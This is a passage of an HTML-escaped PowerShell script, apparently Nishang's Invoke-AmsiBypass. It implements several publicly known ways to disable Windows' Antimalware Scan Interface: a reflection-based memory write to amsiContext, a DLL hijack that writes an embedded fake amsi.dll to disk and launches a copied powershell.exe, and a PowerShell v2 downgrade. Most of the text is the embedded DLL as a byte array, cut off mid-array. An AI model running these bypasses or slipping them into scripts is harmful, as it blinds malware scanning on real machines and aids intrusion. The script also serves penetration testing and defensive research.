\u0026#39;[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(\u0026#39;\u0026#39;System.Management.Automation.AmsiUtils\u0026#39;\u0026#39;).GetField(\u0026#39;\u0026#39;amsiContext\u0026#39;\u0026#39;,[Reflection.BindingFlags]\u0026#39;\u0026#39;NonPublic,Static\u0026#39;\u0026#39;).GetValue($null),0x41414141)\u0026#39; } else { Write-Output \u0026#34;Executing the bypass.\u0026#34; [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(\u0026#39;System.Management.Automation.AmsiUtils\u0026#39;).GetField(\u0026#39;amsiContext\u0026#39;,[Reflection.BindingFlags]\u0026#39;NonPublic,Static\u0026#39;).GetValue($null),0x41414141) } } \u0026#34;dllhijack\u0026#34; { Write-Verbose \u0026#34;Using Cornelis de Plaa\u0026#39;s DLL hijack method.\u0026#34; if ($ShowOnly -eq $True) { Write-Output \u0026#34;Copy powershell.exe from C:\\Windows\\System32\\WindowsPowershell\\v1.0 to a local folder and dropa fake amsi.dll in the same directory.\u0026#34; Write-Output \u0026#34;Run the new powershell.exe and AMSI should be gone for that session.\u0026#34; } else { [Byte[]] $temp = $DllBytes -split \u0026#39; \u0026#39; Write-Output \u0026#34;Executing the bypass.\u0026#34; Write-Verbose \u0026#34;Dropping the fake amsi.dll to disk.\u0026#34; [System.IO.File]::WriteAllBytes(\u0026#34;$pwd\\amsi.dll\u0026#34;, $temp) Write-Verbose \u0026#34;Copying powershell.exe to the current working directory.\u0026#34; Copy-Item -Path C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Destination $pwd Write-Verbose \u0026#34;Starting powershell.exe from the current working directory.\u0026#34; \u0026amp; \u0026#34;$pwd\\powershell.exe\u0026#34; } } \u0026#34;psv2\u0026#34; { Write-Verbose \u0026#34;Using PowerShell version 2 which doesn\u0026#39;t support AMSI.\u0026#34; if ($ShowOnly -eq $True) { Write-Output \u0026#34;If .Net version 2.0.50727 is installed, run powershell -v 2 and run scripts from the new PowerShell process.\u0026#34; } else { Write-Verbose \u0026#34;Checking if .Net version 2.0.50727 is installed.\u0026#34; $versions = Get-ChildItem \u0026#39;HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\u0026#39; -recurse | Get-ItemProperty -name Version -EA 0 | Where { $_.PSChildName -match \u0026#39;^(?!S)\\p{L}\u0026#39;} | Select -ExpandProperty Version if($versions -match \u0026#34;2.0.50727\u0026#34;) { Write-Verbose \u0026#34;.Net version 2.0.50727 found.\u0026#34; Write-Output \u0026#34;Executing the bypass.\u0026#34; powershell.exe -version 2 } else { Write-Verbose \u0026#34;.Net version 2.0.50727 not found. Can\u0026#39;t start PowerShell v2.\u0026#34; } } } \u0026#34;obfuscation\u0026#34; { Write-Output \u0026#34;AMSI and the AVs which support it can be bypassed using obfuscation techqniues.\u0026#34; Write-Output \u0026#34;ISE-Steroids (http://www.powertheshell.com/isesteroidsmanual/download/) and Invoke-Obfuscation can be used (https://github.com/danielbohannon/Invoke-Obfuscation).\u0026#34; } } } function Invoke-AmsiBypass { \u0026lt;# .SYNOPSIS Nishang script which uses publicly known methods to bypass/avoid AMSI. .DESCRIPTION This script implements publicly known methods bypass or avoid AMSI on Windows machines. AMSI is a script malware detection mechanism enabled by default in Windows 10. (https://msdn.microsoft.com/en-us/library/windows/desktop/dn889587(v=vs.85).aspx) This script implements 6 methods of bypassing AMSI. unload - Method by Matt Graeber. Unloads AMSI from current PowerShell session. unload2 - Another method by Matt Graeber. Unloads AMSI from current PowerShell session. unloadsilent - Another method by Matt Graeber. Unloads AMSI and avoids WMF5 autologging. unloadobfuscated - \u0026#39;unload\u0026#39; method above obfuscated with Daneil Bohannon\u0026#39;s Invoke-Obfuscation - which avoids WMF5 autologging. dllhijack - Method by Cornelis de Plaa. The amsi.dll used in the code is from p0wnedshell (https://github.com/Cn33liz/p0wnedShell) psv2 - If .net 2.0.50727 is available on Windows 10. PowerShell v2 is launched which doesn\u0026#39;t support AMSI. The script also provides information on tools which can be used for obfuscation: ISE-Steroids (http://www.powertheshell.com/isesteroidsmanual/download/) Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation) .PARAMETER Method The method to be used for elevation. Defaut one is unloadsilent. .PARAMETER ShowOnly The bypass is not executed. Just shown to the user. .EXAMPLE PS \u0026gt; Invoke-AmsiBypass -Verbose Above command runs the unloadsilent method. .EXAMPLE PS \u0026gt; Invoke-PsUACme -Method unloadobfuscated -Verbose Above command runs the unloadobfuscated method. .LINK http://www.labofapenetrationtester.com/2016/09/amsi.html https://github.com/samratashok/nishang #\u0026gt; [CmdletBinding()] Param( [Parameter(Position = 0, Mandatory = $False)] [ValidateSet(\u0026#34;unload\u0026#34;,\u0026#34;unloadsilent\u0026#34;,\u0026#34;unloadobfuscated\u0026#34;,\u0026#34;unload2\u0026#34;,\u0026#34;dllhijack\u0026#34;,\u0026#34;psv2\u0026#34;,\u0026#34;obfuscation\u0026#34;)] [String] $Method = \u0026#34;unloadsilent\u0026#34;, [Parameter(Position = 1, Mandatory = $False)] [Switch] $ShowOnly ) $AmsiX86 = \u0026#34;77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 248 0 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 190 171 71 149 250 202 41 198 250 202 41 198 250 202 41 198 243 178 186 198 248 202 41 198 148 145 40 199 249 202 41 198 148 145 42 199 251 202 41 198 148 145 44 199 242 202 41 198 148 145 45 199 241 202 41 198 39 53 226 198 248 202 41 198 250 202 40 198 231 202 41 198 40 145 33 199 251 202 41 198 40 145 214 198 251 202 41 198 40 145 43 199 251 202 41 198 82 105 99 104 250 202 41 198 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 76 1 6 0 144 29 62 87 0 0 0 0 0 0 0 0 224 0 2 33 11 1 14 0 0 14 0 0 0 18 0 0 0 0 0 0 43 19 0 0 0 16 0 0 0 32 0 0 0 0 0 16 0 16 0 0 0 2 0 0 6 0 0 0 0 0 0 0 6 0 0 0 0 0 0 0 0 112 0 0 0 4 0 0 0 0 0 0 2 0 64 1 0 0 16 0 0 16 0 0 0 0 16 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 148 36 0 0 80 0 0 0 0 80 0 0 224 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 96 0 0 44 1 0 0 176 32 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 33 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 46 116 101 120 116 0 0 0 124 12 0 0 0 16 0 0 0 14 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 96 46 114 100 97 116 97 0 0 220 7 0 0 0 32 0 0 0 8 0 0 0 18 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 100 97 116 97 0 0 0 136 3 0 0 0 48 0 0 0 2 0 0 0 26 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 46 103 102 105 100 115 0 0 20 0 0 0 0 64 0 0 0 2 0 0 0 28 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 115 114 99 0 0 0 224 1 0 0 0 80 0 0 0 2 0 0 0 30 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 101 108 111 99 0 0 44 1 0 0 0 96 0 0 0 2 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 66 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 192 194 12 0 59 13 4 48 0 16 242 117 2 242 195 242 233 96 3 0 0 85 139 236 139 69 12 131 232 0 116 51 131 232 1 116 32 131 232 1 116 17 131 232 1 116 5 51 192 64 235 48 232 245 4 0 0 235 5 232 207 4 0 0 15 182 192 235 31 255 117 16 255 117 8 232 24 0 0 0 89 235 16 131 125 16 0 15 149 192 15 182 192 80 232 23 1 0 0 89 93 194 12 0 106 16 104 24 36 0 16 232 123 9 0 0 106 0 232 35 5 0 0 89 132 192 117 7 51 192 233 224 0 0 0 232 40 4 0 0 136 69 227 179 1 136 93 231 131 101 252 0 131 61 60 51 0 16 0 116 7 106 7 232 203 7 0 0 199 5 60 51 0 16 1 0 0 0 232 74 4 0 0 132 192 116 101 232 206 8 0 0 104 186 25 0 16 232 177 6 0 0 232 93 7 0 0 199 4 36 57 24 0 16 232 160 6 0 0 232 112 7 0 0 199 4 36 128 32 0 16 104 124 32 0 16 232 78 11 0 0 89 89 133 192 117 41 232 237 3 0 0 132 192 116 32 104 120 32 0 16 104 116 32 0 16 232 42 11 0 0 89 89 199 5 60 51 0 16 2 0 0 0 50 219 136 93 231 199 69 252 254 255 255 255 232 68 0 0 0 132 219 15 133 76 255 255 255 232 52 7 0 0 139 240 131 62 0 116 30 86 232 40 5 0 0 89 132 192 116 19 255 117 12 106 2 255 117 8 139 54 139 206 232 136 8 0 0 255 214 255 5 24 48 0 16 51 192 64 232 201 8 0 0 195 138 93 231 255 117 227 232 131 5 0 0 89 195 106 12 104 56 36 0 16 232 105 8 0 0 161 24 48 0 16 133 192 127 4 51 192 235 79 72 163 24 48 0 16 232 22 3 0 0 136 69 228 131 101 252 0 131 61 60 51 0 16 2 116 7 106 7 232 190 6 0 0 232 180 3 0 0 131 37 60 51 0 16 0 199 69 252 254 255 255 255 232 27 0 0 0 106 0 255 117 8 232 65 5 0 0 89 89 51 201 132 192 15 149 193 139 193 232 78 8 0 0 195 232 164 3 0 0 255 117 228 232 6 5 0 0 89 195 106 12 104 88 36 0 16 232 236 7 0 0 131 101 252 0 139 125 12 131 255 1 116 10 131 255 2 116 5 139 93 8 235 49 255 117 16 87 139 93 8 83 232 218 0 0 0 139 240 137 117 228 133 246 15 132 190 0 0 0 255 117 16 87 83 232 216 253 255 255 139 240 137 117 228 133 246 15 132 167 0 0 0 131 255 1 117 7 83 232 198 9 0 0 89 255 117 16 87 83 232 159 253 255 255 139 240 137 117 228 131 255 1 117 43 133 246 117 30 255 117 16 80 83 232 135 253 255 255 255 117 16 86 83 232 147 253 255 255 255 117 16 86 83 232 116 0 0 0 131 255 1 117 4 133 246 116 4 133 255 117 11 83 232 130 9 0 0 89 133 255 116 5 131 255 3 117 72 255 117 16 87 83 232 98 253 255 255 139 240 137 117 228 133 246 116 53 255 117 16 87 83 232 58 0 0 0 139 240 235 36 139 77 236 139 1 81 255 48 104 22 16 0 16 255 117 16 255 117 12 255 117 8 232 86 2 0 0 131 196 24 195 139 101 232 51 246 137 117 228 199 69 252 254 255 255 255 139 198 232 54 7 0 0 195 85 139 236 86 139 53 160 32 0 16 133 246 117 5 51 192 64 235 18 255 117 16 139 206 255 117 12 255 117 8 232 193 6 0 0 255 214 94 93 194 12 0 85 139 236 131 125 12 1 117 5 232 88 4 0 0 255 117 16 255 117 12 255 117 8 232 177 254 255 255 131 196 12 93 194 12 0 85 139 236 106 0 255 21 40 32 0 16 255 117 8 255 21 0 32 0 16 104 9 4 0 192 255 21 4 32 0 16 80 255 21 8 32 0 16 93 195 85 139 236 129 236 36 3 0 0 106 23 232 234 8 0 0 133 192 116 5 106 2 89 205 41 163 32 49 0 16 137 13 28 49 0 16 137 21 24 49 0 16 137 29 20 49 0 16 137 53 16 49 0 16 137 61 12 49 0 16 102 140 21 56 49 0 16 102 140 13 44 49 0 16 102 140 29 8 49 0 16 102 140 5 4 49 0 16 102 140 37 0 49 0 16 102 140 45 252 48 0 16 156 143 5 48 49 0 16 139 69 0 163 36 49 0 16 139 69 4 163 40 49 0 16 141 69 8 163 52 49 0 16 139 133 220 252 255 255 199 5 112 48 0 16 1 0 1 0 161 40 49 0 16 163 44 48 0 16 199 5 32 48 0 16 9 4 0 192 199 5 36 48 0 16 1 0 0 0 199 5 48 48 0 16 1 0 0 0 106 4 88 107 192 0 199 128 52 48 0 16 2 0 0 0 106 4 88 107 192 0 139 13 4 48 0 16 137 76 5 248 106 4 88 193 224 0 139 13 0 48 0 16 137 76 5 248 104 164 32 0 16 232 225 254 255 255 139 229 93 195 85 139 236 139 69 8 86 139 72 60 3 200 15 183 65 20 141 81 24 3 208 15 183 65 6 107 240 40 3 242 59 214 116 25 139 77 12 59 74 12 114 10 139 66 8 3 66 12 59 200 114 12 131 194 40 59 214 117 234 51 192 94 93 195 139 194 235 249 232 85 7 0 0 133 192 117 3 50 192 195 100 161 24 0 0 0 86 190 64 51 0 16 139 80 4 235 4 59 208 116 16 51 192 139 202 240 15 177 14 133 192 117 240 50 192 94 195 176 1 94 195 232 32 7 0 0 133 192 116 7 232 118 5 0 0 235 5 232 77 7 0 0 176 1 195 106 0 232 207 0 0 0 132 192 89 15 149 192 195 232 97 7 0 0 132 192 117 3 50 192 195 232 85 7 0 0 132 192 117 7 232 76 7 0 0 235 237 176 1 195 232 66 7 0 0 232 61 7 0 0 176 1 195 85 139 236 232 203 6 0 0 133 192 117 24 131 125 12 1 117 18 255 117 16 139 77 20 80 255 117 8 232 136 4 0 0 255 85 20 255 117 28 255 117 24 232 219 6 0 0 89 89 93 195 232 155 6 0 0 133 192 116 12 104 68 51 0 16 232 220 6 0 0 89 195 232 240 6 0 0 133 192 15 132 217 6 0 0 195 106 0 232 221 6 0 0 89 233 215 6 0 0 85 139 236 131 125 8 0 117 7 198 5 92 51 0 16 1 232 186 4 0 0 232 189 6 0 0 132 192 117 4 50 192 93 195 232 176 6 0 0 132 192 117 10 106 0 232 165 6 0 0 89 235 233 176 1 93 195 85 139 236 131 236 12 86 139 117 8 133 246 116 5 131 254 1 117 124 232 31 6 0 0 133 192 116 42 133 246 117 38 104 68 51 0 16 232 80 6 0 0 89 133 192 116 4 50 192 235 87 104 80 51 0 16 232 61 6 0 0 247 216 89 26 192 254 192 235 68 161 4 48 0 16 141 117 244 87 131 224 31 191 68 51 0 16 106 32 89 43 200 131 200 255 211 200 51 5 4 48 0 16 137 69 244 137 69 248 137 69 252 165 165 165 191 80 51 0 16 137 69 244 137 69 248 141 117 244 137 69 252 176 1 165 165 165 95 94 139 229 93 195 106 5 232 6 2 0 0 204 106 8 104 120 36 0 16 232 117 3 0 0 131 101 252 0 184 77 90 0 0 102 57 5 0 0 0 16 117 96 161 60 0 0 16 129 184 0 0 0 16 80 69 0 0 117 79 185 11 1 0 0 102 57 136 24 0 0 16 117 65 139 69 8 185 0 0 0 16 43 193 80 81 232 180 253 255 255 89 89 133 192 116 42 247 64 36 0 0 0 128 117 33 199 69 252 254 255 255 255 176 1 235 31 139 69 236 139 0 51 201 129 56 5 0 0 192 15 148 193 139 193 195 139 101 232 199 69 252 254 255 255 255 50 192 232 59 3 0 0 195 85 139 236 232 11 5 0 0 133 192 116 15 128 125 8 0 117 9 51 192 185 64 51 0 16 135 1 93 195 85 139 236 128 61 92 51 0 16 0 116 6 128 125 12 0 117 18 255 117 8 232 67 5 0 0 255 117 8 232 59 5 0 0 89 89 176 1 93 195 85 139 236 161 4 48 0 16 139 200 51 5 68 51 0 16 131 225 31 255 117 8 211 200 131 248 255 117 7 232 1 5 0 0 235 11 104 68 51 0 16 232 233 4 0 0 89 247 216 89 27 192 247 208 35 69 8 93 195 85 139 236 255 117 8 232 186 255 255 255 247 216 89 27 192 247 216 72 93 195 85 139 236 131 236 20 131 101 244 0 131 101 248 0 161 4 48 0 16 86 87 191 78 230 64 187 190 0 0 255 255 59 199 116 13 133 198 116 9 247 208 163 0 48 0 16 235 102 141 69 244 80 255 21 28 32 0 16 139 69 248 51 69 244 137 69 252 255 21 32 32 0 16 49 69 252 255 21 36 32 0 16 49 69 252 141 69 236 80 255 21 16 32 0 16 139 77 240 141 69 252 51 77 236 51 77 252 51 200 59 207 117 7 185 79 230 64 187 235 16 133 206 117 12 139 193 13 17 71 0 0 193 224 16 11 200 137 13 4 48 0 16 247 209 137 13 0 48 0 16 95 94 139 229 93 195 104 96 51 0 16 255 21 24 32 0 16 195 104 96 51 0 16 232 229 3 0 0 89 195 184 104 51 0 16 195 184 112 51 0 16 195 232 239 255 255 255 139 72 4 131 8 4 137 72 4 232 231 255 255 255 139 72 4 131 8 2 137 72 4 195 184 132 51 0 16 195 85 139 236 129 236 36 3 0 0 83 86 106 23 232 234 3 0 0 133 192 116 5 139 77 8 205 41 51 246 141 133 220 252 255 255 104 204 2 0 0 86 80 137 53 120 51 0 16 232 133 3 0 0 131 196 12 137 133 140 253 255 255 137 141 136 253 255 255 137 149 132 253 255 255 137 157 128 253 255 255 137 181 124 253 255 255 137 189 120 253 255 255 102 140 149 164 253 255 255 102 140 141 152 253 255 255 102 140 157 116 253 255 255 102 140 133 112 253 255 255 102 140 165 108 253 255 255 102 140 173 104 253 255 255 156 143 133 156 253 255 255 139 69 4 137 133 148 253 255 255 141 69 4 137 133 160 253 255 255 199 133 220 252 255 255 1 0 1 0 139 64 252 106 80 137 133 144 253 255 255 141 69 168 86 80 232 252 2 0 0 139 69 4 131 196 12 199 69 168 21 0 0 64 199 69 172 1 0 0 0 137 69 180 255 21 20 32 0 16 86 141 88 255 247 219 141 69 168 137 69 248 141 133 220 252 255 255 26 219 137 69 252 254 195 255 21 40 32 0 16 141 69 248 80 255 21 0 32 0 16 133 192 117 13 15 182 195 247 216 27 192 33 5 120 51 0 16 94 91 139 229 93 195 83 86 190 8 36 0 16 187 8 36 0 16 59 243 115 24 87 139 62 133 255 116 9 139 207 232 56 0 0 0 255 215 131 198 4 59 243 114 234 95 94 91 195 83 86 190 16 36 0 16 187 16 36 0 16 59 243 115 24 87 139 62 133 255 116 9 139 207 232 13 0 0 0 255 215 131 198 4 59 243 114 234 95 94 91 195 255 37 112 32 0 16 204 204 204 204 204 104 75 26 0 16 100 255 53 0 0 0 0 139 68 36 16 137 108 36 16 141 108 36 16 43 224 83 86 87 161 4 48 0 16 49 69 252 51 197 80 137 101 232 255 117 248 139 69 252 199 69 252 254 255 255 255 137 69 248 141 69 240 100 163 0 0 0 0 242 195 139 77 240 100 137 13 0 0 0 0 89 95 95 94 91 139 229 93 81 242 195 85 139 236 255 117 20 255 117 16 255 117 12 255 117 8 104 5 16 0 16 104 4 48 0 16 232 203 1 0 0 131 196 24 93 195 85 139 236 131 37 124 51 0 16 0 131 236 44 83 51 219 67 9 29 16 48 0 16 106 10 232 228 1 0 0 133 192 15 132 116 1 0 0 131 101 236 0 51 192 131 13 16 48 0 16 2 51 201 86 87 137 29 124 51 0 16 141 125 212 83 15 162 139 243 91 137 7 137 119 4 137 79 8 137 87 12 139 69 212 139 77 224 137 69 244 129 241 105 110 101 73 139 69 220 53 110 116 101 108 11 200 139 69 216 53 71 101 110 117 11 200 247 217 106 1 88 26 201 106 0 128 193 1 89 83 15 162 139 243 91 137 7 137 119 4 137 79 8 137 87 12 116 67 139 69 212 37 240 63 255 15 61 192 6 1 0 116 35 61 96 6 2 0 116 28 61 112 6 2 0 116 21 61 80 6 3 0 116 14 61 96 6 3 0 116 7 61 112 6 3 0 117 17 139 61 128 51 0 16 131 207 1 137 61 128 51 0 16 235 6 139 61 128 51 0 16 131 125 244 7 139 69 224 137 69 228 139 69 220 137 69 248 137 69 232 124 50 106 7 88 51 201 83 15 162 139 243 91 141 93 212 137 3 137 115 4 137 75 8 137 83 12 139 69 216 169 0 2 0 0 137 69 236 139 69 248 116 9 131 207 2 137 61 128 51 0 16 95 94 169 0 0 16 0 116 109 131 13 16 48 0 16 4 199 5 124 51 0 16 2 0 0 0 169 0 0 0 8 116 85 169 0 0 0 16 116 78 51 201 15 1 208 137 69 240 137 85 244 139 69 240 139 77 244 131 224 6 51 201 131 248 6 117 51 133 201 117 47 161 16 48 0 16 131 200 8 199 5 124 51 0 16 3 0 0 0 246 69 236 32 163 16 48 0 16 116 18 131 200 32 199 5 124 51 0 16 5 0 0 0 163 16 48 0 16 51 192 91 139 229 93 195 51 192 57 5 20 48 0 16 15 149 192 195 195 255 37 52 32 0 16 255 37 60 32 0 16 255 37 56 32 0 16 255 37 48 32 0 16 255 37 64 32 0 16 255 37 104 32 0 16 255 37 100 32 0 16 255 37 96 32 0 16 255 37 92 32 0 16 255 37 88 32 0 16 255 37 84 32 0 16 255 37 80 32 0 16 255 37 76 32 0 16 255 37 72 32 0 16 255 37 12 32 0 16 176 1 195 51 192 195 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 198 38 0 0 0 39 0 0 20 39 0 0 40 39 0 0 68 39 0 0 186 39 0 0 164 39 0 0 138 39 0 0 116 39 0 0 94 39 0 0 226 38 0 0 0 0 0 0 184 37 0 0 84 37 0 0 152 37 0 0 118 37 0 0 194 37 0 0 0 0 0 0 154 38 0 0 140 38 0 0 116 38 0 0 88 38 0 0 60 38 0 0 26 38 0 0 8 38 0 0 250 37 0 0 238 37 0 0 0 0 0 0 27 28 0 16 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 48 0 16 112 48 0 16 0 0 0 0 0 0 0 0 144 29 62 87 0 0 0 0 2 0 0 0 61 0 0 0 132 33 0 0 132 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 12 0 0 0 20 0 0 0 196 33 0 0 196 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 13 0 0 0 44 2 0 0 216 33 0 0 216 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 14 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 92 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 4 48 0 16 128 33 0 16 1 0 0 0 112 32 0 16 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 75 26 0 0 82 83 68 83 69 10 117 219 0 114 41 77 133 149 98 78 29 103 122 248 7 0 0 0 67 58 92 68 101 118 101 108 111 112 109 101 110 116 92 65 109 115 105 92 82 101 108 101 97 115 101 92 65 109 115 105 46 112 100 98 0 0 0 0 0 0 0 0 20 0 0 0 20 0 0 0 1 0 0 0 19 0 0 0 71 67 84 76 0 16 0 0 124 12 0 0 46 116 101 120 116 36 109 110 0 0 0 0 0 32 0 0 112 0 0 0 46 105 100 97 116 97 36 53 0 0 0 0 112 32 0 0 4 0 0 0 46 48 48 99 102 103 0 0 116 32 0 0 4 0 0 0 46 67 82 84 36 88 67 65 0 0 0 0 120 32 0 0 4 0 0 0 46 67 82 84 36 88 67 90 0 0 0 0 124 32 0 0 4 0 0 0 46 67 82 84 36 88 73 65 0 0 0 0 128 32 0 0 4 0 0 0 46 67 82 84 36 88 73 90 0 0 0 0 132 32 0 0 4 0 0 0 46 67 82 84 36 88 80 65 0 0 0 0 136 32 0 0 4 0 0 0 46 67 82 84 36 88 80 90 0 0 0 0 140 32 0 0 4 0 0 0 46 67 82 84 36 88 84 65 0 0 0 0 144 32 0 0 4 0 0 0 46 67 82 84 36 88 84 90 0 0 0 0 160 32 0 0 220 0 0 0 46 114 100 97 116 97 0 0 128 33 0 0 4 0 0 0 46 114 100 97 116 97 36 115 120 100 97 116 97 0 0 0 132 33 0 0 128 2 0 0 46 114 100 97 116 97 36 122 122 122 100 98 103 0 0 0 4 36 0 0 4 0 0 0 46 114 116 99 36 73 65 65 0 0 0 0 8 36 0 0 4 0 0 0 46 114 116 99 36 73 90 90 0 0 0 0 12 36 0 0 4 0 0 0 46 114 116 99 36 84 65 65 0 0 0 0 16 36 0 0 4 0 0 0 46 114 116 99 36 84 90 90 0 0 0 0 24 36 0 0 124 0 0 0 46 120 100 97 116 97 36 120 0 0 0 0 148 36 0 0 60 0 0 0 46 105 100 97 116 97 36 50 0 0 0 0 208 36 0 0 20 0 0 0 46 105 100 97 116 97 36 51 0 0 0 0 228 36 0 0 112 0 0 0 46 105 100 97 116 97 36 52 0 0 0 0 84 37 0 0 136 2 0 0 46 105 100 97 116 97 36 54 0 0 0 0 0 48 0 0 24 0 0 0 46 100 97 116 97 0 0 0 24 48 0 0 112 3 0 0 46 98 115 115 0 0 0 0 0 64 0 0 20 0 0 0 46 103 102 105 100 115 36 121 0 0 0 0 0 80 0 0 88 0 0 0 46 114 115 114 99 36 48 49 0 0 0 0 96 80 0 0 128 1 0 0 46 114 115 114 99 36 48 50 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 254 255 255 255 0 0 0 0 208 255 255 255 0 0 0 0 254 255 255 255 0 0 0 0 110 17 0 16 0 0 0 0 254 255 255 255 0 0 0 0 212 255 255 255 0 0 0 0 254 255 255 255 0 0 0 0 233 17 0 16 0 0 0 0 254 255 255 255 0 0 0 0 212 255 255 255 0 0 0 0 254 255 255 255 203 18 0 16 234 18 0 16 0 0 0 0 254 255 255 255 0 0 0 0 216 255 255 255 0 0 0 0 254 255 255 255 215 22 0 16 234 22 0 16 20 37 0 0 0 0 0 0 0 0 0 0 220 37 0 0 48 32 0 0 44 37 0 0 0 0 0 0 0 0 0 0 164 38 0 0 72 32 0 0 228 36 0 0 0 0 0 0 0 0 0 0 206 39 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 198 38 0 0 0 39 0 0 20 39 0 0 40 39 0 0 68 39 0 0 186 39 0 0 164 39 0 0 138 39 0 0 116 39 0 0 94 39 0 0 226 38 0 0 0 0 0 0 184 37 0 0 84 37 0 0 152 37 0 0 118 37 0 0 194 37 0 0 0 0 0 0 154 38 0 0 140 38 0 0 116 38 0 0 88 38 0 0 60 38 0 0 26 38 0 0 8 38 0 0 250 37 0 0 238 37 0 0 0 0 0 0 40 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 105 110 118 111 107 101 95 116 114 105 103 103 101 114 0 41 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 114 101 116 117 114 110 95 116 114 105 103 103 101 114 0 37 0 95 95 115 116 100 95 116 121 112 101 95 105 110 102 111 95 100 101 115 116 114 111 121 95 108 105 115 116 0 0 72 0 109 101 109 115 101 116 0 0 53 0 95 101 120 99 101 112 116 95 104 97 110 100 108 101 114 52 95 99 111 109 109 111 110 0 86 67 82 85 78 84 73 77 69 49 52 48 46 100 108 108 0 0 56 0 95 105 110 105 116 116 101 114 109 0 57 0 95 105 110 105 116 116 101 114 109 95 101 0 65 0 95 115 101 104 95 102 105 108 116 101 114 95 100 108 108 0 53 0 95 105 110 105 116 105 97 108 105 122 101 95 110 97 114 114 111 119 95 101 110 118 105 114 111 110 109 101 